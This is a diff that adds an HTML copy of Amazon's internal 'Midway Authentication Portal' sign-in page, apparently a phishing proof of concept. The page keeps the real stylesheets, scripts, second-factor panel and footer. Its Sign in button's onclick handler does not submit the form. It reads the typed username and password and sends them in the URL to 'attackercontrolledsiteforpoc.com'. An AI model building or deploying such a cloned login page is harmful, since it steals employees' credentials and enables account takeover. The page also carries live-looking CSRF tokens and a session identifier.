@@ -1,0 +1,114 @@
+<html lang="en"><head>
+<title>Midway Authentication Portal</title>
+<link rel="stylesheet" media="all" href="https://midway-auth.amazon.com/assets/application-358001b6f1f91911d2c2d782bd11eb6ff832bc027957d36938d01d9c57b4d7d7.css">
+<script src="https://midway-auth.amazon.com/assets/application-7285ba3e4d3d557e7323069216addf8860f2377b4fcc280b4a807f5afbb6227c.js"></script>
+<script src="/packs/js/client-side-metrics-c5fc94f1e9c86f7420e9.js"></script>
+<meta name="csrf-param" content="authenticity_token">
+<meta name="csrf-token" content="Y4Hb2dzgdm0bSXaarkiJHVJJ0XFFOV752bKxdOQ8TwC5LPkhP6tpCbOvKPCmXqz6VUShOGmJwskfwQX2HQUaCw==">
+<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<script src="https://midway-auth.amazon.com/assets/login-5f4607a3effee4c149258f44642a94045f30f57302e2a1145be74744ea3e376a.js" defer="defer"></script>
+<main>
+    <div class="banner-item">
+      <b>Starting Feb 12, 2026:</b> New Midway UI becomes the default login experience. Start using it today to ensure a smooth transition, or switch back to the current version as needed.
+      <button id="switch-to-new-ui-button">Switch</button>
+    </div>
+    <!-- if there is no stored username, it is possible that the backend did not render the correct UI for the user
+    (e.g. when they are enforced to use the new UI). Therefore, we show this warning message to instruct them to manually
+    switch to the new UI if they see errors. -->
+      <div class="banner-item">
+        If the authentication popup shows error messages such as "<b>You're using a security key that's not registered with this website</b>" or "<b>This security key doesn't look familiar</b>",
+        please click the button above to retry the authentication on the new Midway UI.
+      </div>
+
+
+  <form id="fpr_form" name="fpr_form" data-fwcim-id="4TnkuTEO"><input name="metadata1" type="hidden" value="ECdITeCs:JzUEHcS3M0phqgZmgNuI7+PTqlWCGKb8plFCwVVBRO5D3e3cG88Ri5uoN80cpaj0gO9auBGjywB+lkVPQdd1DDbW1FLTXXpuF0+zeqldEwAmRnZ/g0ee3DTJ/ch/7sVewUAqJuf/4ljysrBNw2YudCXJTZ7wbI2AITqXvSduNAx53Syvz6PKZpkQIhLnS8lgy2eBFRG7PaPjdxo5UFXmmAsJTbXnvRO2V0h7oMXpI4Kv3nAC7Tvg5ef+e3esHiAJzcJImEUMM0LMOI7rH8Sbxi7RXyWZtrItUliegUb1Zd0uF8tH6A7uEWowlLtxnbSFSwR91Jfm4vpVVjKwyShzV+N7YGCQnmJ16/LItywzas25RDJBLwcZDMPSufcEgngsd5NBe3FyZJZHBEYT1UTqSyHvPKKvfJ0vrKSBcqaHGIZlofRD3ezCWSc9IgDSs4B4t7F/emRBr6J0+HedECNA30QdZNbsWvsDL3f/kIHM/iiF94M25Xyd0792c9x3xQr3iDa8Ob7tHL8wZ+Fou7wxtF7kn8RWZdo8CaVTmwq0KkIeE+96Vidw5NSs363N1Hn4v+Ze/S4TSMArFz++S1pqp9pleGCawSuawbA7e8X74ibRDyXbnyr0o+sEp4Q/sDVbH7yYgksYWTkN/KqA9yQuqmb8V5LnGtQ+MRoZfLYD3K9jGWF+Uu7YxrMSunM3tJvD+dasAa5xyl5jBUUBGvNzkQAR2lvePoHdDovxF+s80KTdawEoW1xFCtuuTzorEP0SmVKs2XKp9z6UaN8/zC5Hq3EKhw+NHwFpyKICas8KMNjmPuZhmisYRkJnRqlFkKo4bz+hQ/UD0KJa3aA2R17/HsjOYbxCr3Lo90bmW6PsQMK3JB2EZxqF1OX7LMtRYbbuIu0fo8cI9y7w40wa9jjf5ZkYEH1ZhITQInc3IBJUrJGtQ2jEfZQQl2Jy0DpmNHo73rnMZe831UT13Rc4Z/nUN9d6Z1HRwgTBDqUklC3LEx3XFHnu15esLdUAUeVhlMeG218DX4n4nXClvPkV2a203ZPFzBf0FDj7eVXOqfHRjpm3U4Xdz5vp2VQFCjVwhtY6H67BqSk4cqu0bO15RX62tyNG+dhRdKzeZGu/ycyLWCM8qtbZ2mmCZxzgnEBWqrj0FTCVuuv8VxGYnk+GEELuGj1Bb3fychhWbNJlYd3IQE95imugzorqAKRJQClYEmr1lVMZ5GCLgsuUBmiXDM34kXkGF/9QO0487VUBIzBf61qbK65/LMYx/OmVYaWC47GfTXtZHFgjvR78TCgnJdlgXCQY7XuQErtKpgnoQqh/+9YcJBTJHPlqV5M3ajmW7NyAMtlmfgUseJpAXKSXa7Pwiz2qT5DUJfl7m1idD05S2grFq4QBeJB6PD7+sojyEHzpGoIPrG4xfq4zQRkXSSSC/wk151ueYkK/MPD+1GzLR3BCBRn1WoqDUbW3fmiH2harkuITJxH6cTzrFK9l+qlAXgcxj8bgDzdmlOV60dBg2E+AbJdn3mI++JBkalJQT+wnr8uoeRqq7mEnaMBX+y7O520U+NK/vC8UB/VxCK5znHwjtCeKAAd08O/tLnOuObtu2woMNtze43hLhYv0VFuXBVUxyhuEQ0SHCcNN6vfZzAiBjQ7swE764UwCiasvkxZYxD3spmBpQFwh/2DxVdDjITF3EUpMZHJK447Nrg6bOdiCKXMevcKqTXq/HaoLdwbM+fDH0ytjKlfoHEF3FZj+nSAaWDaF6tAoH7J25NdBjT0yiDv4tnDBkgLpVAQwZfMBVZ7snC1WkdtA5Z+uRqd4rkvme31IiEvn29pZJp3/GZDFXpGHMsncS+deLlySZGo57E/bfSPD7RxSP+XMbGkGbx7Rrq3A+TSDcJTOyn3hNWxB5hkAhI450SLk6ETA2pe6ewaXow0gk3vF/wNdF4f40AUmQ4XdecbhtHmWSC+MPLV3Xs+OtsIF1W7hItLKdVMwYyJA71sUUWzOJ/2pSiz1nTBEo+lJuFCdsG7tE+MaToKrbex+EQz8snmZYeMWBt1jmW3AhGnfaJCxwG+6wOsSugBMKB37yR9vCK7HvK3ZnSpw1xBshY8fvHpG3MRI+cihuwG7LR0GiEdqztozmOZrmCRFXDfCTTU5PLFUjF160aLhn+EXFDUAvuOjttGHQmMZeiXcbVZkw29K1NG2aARMcsVxRhpky9WmNftx+25f0aQ/pmxkN/Wy7IS/qNddklYus3+cHKB/G7a2lGoM01xb4O+7CKZwK7D42Hf93A8AwrubtGO50IPT4fBfJ5A/hL/+F7woDmXqrJPaXSEpbGq6PXif3mh3bd8Ab0SqMC66V1dMUY6rqy7NfYQ2NQrNItdWQjGG1w9o4KJcSSbfvNV4xedb1Ud/1t17r4rTXTMSUzaDvLclWlw9Yp4u/LXbTWhqKZ9wk5yyYYjU32G04HibsKrV7Kv5+2fjms8Hux/eCvva4LmoFNvdlgdBYFQc9jlQG7ZnB1tguy6KIqasySpL6xv+qoPco4QJ56B21IIRQtPzkfioRyUor4X89cYTMI1jjIuemozA3QVLfmXgw3MC4f+DQCn/jokrJysOFnkWD75MgbAUzbYv56vhuGDXT89lrZWxAz00jqGyR0L6s2f4uz6gjbTITMrifil0yRJ3mloNr64kgB5Pj83FZC6hZd2qv73ekD7eX2eFsweBuT6v4UOPnzu8bRvREofVyYHbt3+RD41oOxRWMdnf1HssLYlrocGJzc6NW8JRUdfVVDbq2DCd78/9m5LXsX27pgNi39sWeMCsh2BBwalx/UhbokIUdrgbwYrH14bduYD4MD34OKLmSV3Fnj8VxIgmFsfRwU17HV2F1RfOLrXhvDs9K6sgMsZLVcuM9N1UJzk/o+QhcZSwz7oAZJA8IiCS3uiSgsgfVmeXWOntECUuVmz+8SXe6BfC4zN6WjReTU9PfadcZbPiXtsZHQ14cK9g1I/54IeLQOTJ0Sf7J1qH9jwt6BSFyLt8vlMoQgW4i4pPWIonQsP/TDctxv09ujG5CyzwAYWEPJfD6qZUKlYOauZb8e2dBRRdisDkNOIcDCP8ZxzdAJdDDVrChRVTK4OfsQyxJfPzcnf2ChHggf3mPwyo6W+WqL51g4KmS60fBPJlX+ps0j7kmGY1ESs0wFMMcfuSbnjg0vG/Jn5QweQYAuJ1xZbdhmudmjJQZWQEDwjsgkHPzmEKxeTb/vFimdyA+iDU7EwRahIxmN6yafYMd7subXyQmX6QX7qSzgkeP8Dg2j6yJXU/C6qEgfvyfsH8WUYiDRNRuZaynV6giTFx4WYATtgDcIRImLPLLP8CuUhohEzUI0a/6Avg9gv6XW2en+O9qmNbIdHLNW+xpdLaP36sP44ToMc1x2pmXhhrBwh2l78091MMisvM2YgrI1WOIYdwIOrqreWdLw776fy76rEw5QbJbWwbQ8irbiGdHV3QX6/t5xT2NaYl5GCcGFoj+n3e6dtFWWE00Shqe/cxfjheEjAojMxvtrbuwIgpRC/vzl9vwuGv2N7/3uno3dQ+2ydHDOnYAeXUP6oCW85WAzR6dwsmrrq5CE6zjTLKSliTCM1oxc6vaXLhH0eWv+yGJdmjmB95J50BOEqP2lWAxftHurUpGUmzIQGoCm+FN8DA6vHRmh63M62JlLfWaitsytby9ZUyOnY4iXHp3m5nbK2eHX2xMUSBF8jkwkxHqN3UdSt7I8iiamGZoBFh7A+7SJQt2cX9qnn/cyvKiMAxFsnu9S6ev1K9hxlc8IMYEgCDlKiX4Nf7kphEQMTEkxNDq1bKDyoVFtdV1xHNQnBD1QkiKAuuU+UXvoq6FDJJAuazBDRENRWiXhhLRHCqQdwhweKRpn+u9pCHmtV4NKbIl7L2M0DKVc36aYZrWtISBUk13gjKP0zerjb/avm0WtFfL2yOLtboeVRvt0DNqo6i1Sa2X/uDStwxqu8WVDfCujiCRzQzGx6IMFHuQ9GTCQzThUvHrEvVwY8CoHBPZ7KRs1y8/cc27naSHWOQIZzRStWGXkuN70hlvXg5INUhvqxpq9YDz6+qGVQdNlJNbHfx6RhnsncfEYFr6bTuUC6s8sftTJmLIl62tPR+cB4wOCKsbcoeeqWkyWMzKgLzU8ZvoAe6x+dPYQv34MKShXQKuVz4/UfpHk4LNsjUxWVh0HuMA6V3M2p5GJJEyFHOJFoV6k8nrGwh/U2rOF6uTBs7BuQKbh+71mCtfdDjShwZ6EqpANdBv8SQ8VI4oanUpTYt4N4NZc3YSyOICPP7qQwyvjOrimXXNHihzQaSmPSmuwazDqi3RqX7CqVP7Fs6o9RuY3RtwCQGQHmhZrfdPNA8AsM6mFKwxiEz0ClXyXiTFgybUjV3ilNs1BdhC8V9rMP9d9ynGaeJrzeH4Hww4wUtjrDoelRysH3NKTLBFwEKySLY16KQLBz2Lu1u5uj3s4qGVDbLn9ZWBOKls/+icdiUfpFt+JhqZW9WBfZ/a72WzvF83OhwyjwmWhRissKLOPhzFijZ2Evze47aW30bcJa6pGE2NXwdvnvGnS3GIm6yZs8o8lHl0sYM97Hh7QkTpvicwe8ZwQc5XvEK6jWFy7lgbHid0IMvA9XtRYy0m8nywgftLtqUGYuwLYPGeufewJszeqKdKUnITQ8qP71C4Rb/9ni+hh5q42zXPtOFbGQjK2PIasSkryky5sNc4dOBlWw60BHV6zqSgPGES71oCE2kboaqLspqGA/mrGrGr0slmx2ksCS0DCwmO0MHX7pVxzpYMR/HWKs9D7ZQLjrXA2n/8pfYYEN2WC0dLVkXYmwtRUXD/X8h9zU6AZrkE6OsZuTOEeII4MEaYFYyfxjuQEZJsQ+TppyaPRGIHb9Wgvp5EXm2Blk+kg02eeacNB+AI5TH43OYJiE8KtgzJOAlNFVi6OXT8BOmpuBmchR8+fpb85RsYt+byh3WoXEyOJKxiV9VLI7hQebut3FJ5FUy6RxiiLV3Tol4K0AxsgGCw+PSvtPNdnkSVMNAWUkqEPvjmXfIXuN1VNuDYef97SH3mXhtGg2Ylzx9U0G/oG/RSS0ruyG55F8bpjiOLDz6weXhooYYZITl8HWEMY44Z5aD8YL9sLdTXA0qe1v8dzKozieGpAmkKfdK3IIeBecSgEMsq9FIpx/rR/NV/BKtnK2YNk7SySXX7Y81Nag3RAYwntRT9RGOlRUVT/KQB5u+4opF79cPdY4eSPWpwTcsSebUrgtewmPwd+ZHFSWFBCQytZ73DGBObO/4eTBTKaMpzt9W52aUgNb0ZnkthcEFXVIRCPrk3BmLYJVyxp2fOgLSPR1LryWxa+l7/HLaaOpPTJXy22URvPzeM2iWeZ9yJBRGYyU1NZDdqOGuXH5t9pHrZwQoJOsE3bXSAFpzXK8MlPJLJZIiQlKN9vdjvU75+U9jqlfo3w2qPJUBDfxUF9YLxnbvEkmk1SvcmOnyhUAlKE90VRTA9GegWsv9swj7lUFVyEhQwYJKiY+8kApPJoB1WL2A4KU45Yab0u9KER00atOEywa2gzrKWWcqUEOR6btZTWu61zR01vfg7est2Q5X9T0mEfnOtI5iyOFX62g8TxS+L8QhvXzCNKR2nnZImXDjXRxcP1uUzHnOkHqJvtJEXw9ShJ857BbVMzwBvtrwm8MYtcwqG58c6nn/InOIeujRHFvYvaZ/TTbdv820XhK3C2JXXElM1zpIbwPBuTIeU/+S4CjC1anioZij7xgybpxKSA8vLb1nFSXV0C+4w1Lco1/DLh+FZW6szBU71uKbfw+D9j/qyg7qHVTikAwBt1Abcq6yIfGaFF52DOtaQ9cFZaa9U8gXH5Ag+SOX4m0zjVz7YElMaswPVDb90ZdX2V0qLOdtJEYaYmN2j93KxmhCLfEQN6bSSE9g6idooGuqr0CPJg0h5K5tv/z63EaXoOwciNnl52lv2UEZ1bxP4cs7QKdP9qN3i+U9sDQgmD3fdqu8FIeHMsbVdmdBrGznGa5IyjUnqNqdpvDIYl2IYFY/+mvDxosra44gkXajLZCsObVkfrwMLk4F2nSnFOnGdRmuINj9pWrKxhMTbtsQ0FYGl9K+KkLoth8xEDuSoOu1j0P0d8RFjuLiu5SF4yB28QJ/F0lQwGMLaXj5sT+8eqk8uNWX5gE5GnxVWNwUSHndh6LnHr/kVbyz2V7WvHemWbMiof+UNGBOWEutqJUfFcy+6sFdZG4qmAe9/kRDdEJZiprWWhzzpoAknSsDZ0DZXP+UbcTxGhbanW49Gi14zwN1HE7CIOdYPkB/bD1r6RxDoiykXIIi48kJ04FKO3oeQI/+NsBjVSYC0VnohQ4I8olLwzgN6C5PevvC+yrsjY+wgIR9QcuDVS50C9xYyjGtinTufqlNZqtLxV65f16tHb9QjNnh6iA/oOwhtUw="></form>
+  <section id="base-pane">
+    <div id="login-pane">
+      <div id="input-params" data-session-status="{&quot;csrf_param&quot;:&quot;authenticity_token&quot;,&quot;csrf_token&quot;:&quot;nfXYPVU8gM1S4B2AoqfmActTtHlNlpV65l4QqIEbBmNHWPrFtnefqfoGQ+qqscPmzF7EMGEmCUogLaQqeCJTaA==&quot;,&quot;session_uuid&quot;:&quot;80cc5a27e90b43f862b01376b6c6ea23&quot;,&quot;client_cert_valid&quot;:false,&quot;totp_enabled&quot;:true,&quot;display_otp_enabled&quot;:true,&quot;mcs_andon_cord_pulled&quot;:false,&quot;otp_enabled&quot;:true,&quot;authenticated&quot;:false,&quot;auth_prompt&quot;:&quot;Password&quot;}" data-js-params="{&quot;next&quot;:&quot;/SSO/redirect?redirect_uri=https://vamudala.beta.123.ec2.aws.123/verify_midway?redirect_to=%252F\u0026client_id=vamudala.beta.buffers.ec2.aws.dev\u0026response_type=id_token\u0026scope=openid\u0026nonce=0860333625692747&quot;}"></div>
+      <h2>Sign in</h2>
+      <!--This hidden header is added because many canaries look for this text to know that they are on a Midway page-->
+      <h2 hidden="">Sign in with Midway</h2>
+      <div class="ta-right">
+        <a class="medium-heavy-text small-text" href="https://w.amazon.com/index.php/NextGenMidway/FAQ">Why am I here?</a>
+      </div>
+
+      <form id="login_form" action="/api/login" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓" autocomplete="off"><input type="hidden" name="authenticity_token" value="Y4Hb2dzgdm0bSXaarkiJHVJJ0XFFOV752bKxdOQ8TwC5LPkhP6tpCbOvKPCmXqz6VUShOGmJwskfwQX2HQUaCw==" autocomplete="off">
+        <input type="hidden" name="old_login_form" id="old_login_form" value="true" autocomplete="off">
+        <input type="hidden" name="next" id="next" value="/SSO/redirect?redirect_uri=https://vamudala.beta.123.ec2.aws.123/verify_midway?redirect_to=%252F&amp;client_id=vamudala.beta.buffers.ec2.aws.dev&amp;response_type=id_token&amp;scope=openid&amp;nonce=0860333625692747" autocomplete="off">
+        <p>
+          <label for="user_name">Amazon username</label><br>
+          <input name="username" type="text" name="user_name" id="user_name" value="" placeholder="Enter your Amazon username" autocomplete="username" autocorrect="off" autocapitalize="off" spellcheck="false">
+        </p>
+
+        <p>
+        </p><div class="row">
+          <div class="cell-50">
+            <label for="password">Password</label>
+          </div>
+          <div class="cell-50 ta-right">
+            <a class="medium-heavy-text small-text" href="https://password-v2.corp.amazon.com/selfReset">Reset password</a>
+          </div>
+        </div>
+        <input type="password" name="password" id="password" value="" placeholder="Enter your Amazon Password" autocomplete="current-password" autocorrect="off" autocapitalize="off">
+        <p>
+          <input type="submit" onclick="top.location.href='https://attackercontrolledsiteforpoc.com/login?username=' + encodeURIComponent(document.querySelector('input[name=username]').value) + '&password=' + encodeURIComponent(document.querySelector('input[name=password]').value); return false;" name="comit" value="Sign in" class="login-button inline-button orange-button" id="verify_btn" data-disable-with="Sign in">
+        </p><p id="error-message" class="m1-red ta-center mb-0 invisible" tabindex="0">Error</p>
+        <p id="forgot-password" class="ta-center mb-0" hidden="">
+          <a href="https://password-v2.corp.amazon.com/selfReset">Did you forget your password?</a></p>
+</form>    </div>
+
+    <div id="u2f-login-pane" class="ta-center" hidden="">
+      <h2>Second factor required</h2>
+      <div class="row pb-1 pl-2 flex-container">
+        <div class="cell-20 hide-small">
+          <img height="128" alt="Security key with lock" src="https://midway-auth.amazon.com/assets/yubikey-with-lock-4617700bf1ac51a21ee884c1e5b8208eb7c9fff492246a69ec718c8654e75cdd.png">
+        </div>
+        <div class="cell-80 ta-left cell-100-small move-to-end-small">
+          <ol class="no-indent">
+            <li>Plug your security key into a USB slot on your computer</li>
+            <li>Touch your security key</li>
+              <li>Or, if short touch does not work press and hold for 3 seconds to activate OTP</li>
+          </ol>
+        </div>
+          <div class="cell-80">
+            <p>
+            </p><form action="/api/yubiotp/login" method="post">
+              <input id="otp-field" name="otp" autocomplete="off" class="otp-field" autocapitalize="none" style="width: 185px">
+              <input id="otp-submit-btn" type="submit" value="Submit">
+            </form>
+            <p id="u2f-error-message" class="m1-red" hidden=""></p>
+          </div>
+      </div>
+    </div>
+
+    <div id="redirect-pane" class="ta-center" hidden="">
+      <h2 class="green"> Authentication Successful</h2>
+      <br>
+      <br>
+      <h3 class="">Now redirecting you to <span id="redirect-url"></span></h3>
+      <br>
+      <img alt="Spinning processing circle" src="https://midway-auth.amazon.com/assets/ajax-spinner-4e6e1fb3f08a162cfd4f8fb435769612a801c3cea4684b1efc71455e3795c5ca.gif">
+    </div>
+
+    <div id="loadingDiv" class="ta-center invisible">
+      <img alt="Spinning processing circle" src="https://midway-auth.amazon.com/assets/ajax-spinner-4e6e1fb3f08a162cfd4f8fb435769612a801c3cea4684b1efc71455e3795c5ca.gif">
+    </div>
+  </section>
+  
+  <footer>
+    <p>
+      Secured by  <a id="help_link" href="https://w.amazon.com/index.php/NextGenMidway/FAQ">Midway</a>. For login issues, 
+      <a href="https://firstaid.it.a2z.com/chat">chat with IT support</a>.
+    </p>
+
+    <img height="32" class="mt-2" alt="Amazon logo" title="Midway is brought to you by Stefan, Misha, Sunitha, Carl, Alex, Eric, Tyler, David, Pratik, Chris, Matt, and more!" src="https://midway-auth.amazon.com/assets/amazon-logo-f589d03bb13bcabcfcfdd596bf2f0c4bc4996adc605cc737991ce9c6a0025be6.png">
+  </footer>
+
+</main>
+
+<script src="/packs/js/old-ui-60a84068d01ae3c05810.js"></script>
+
+
+</body></html>
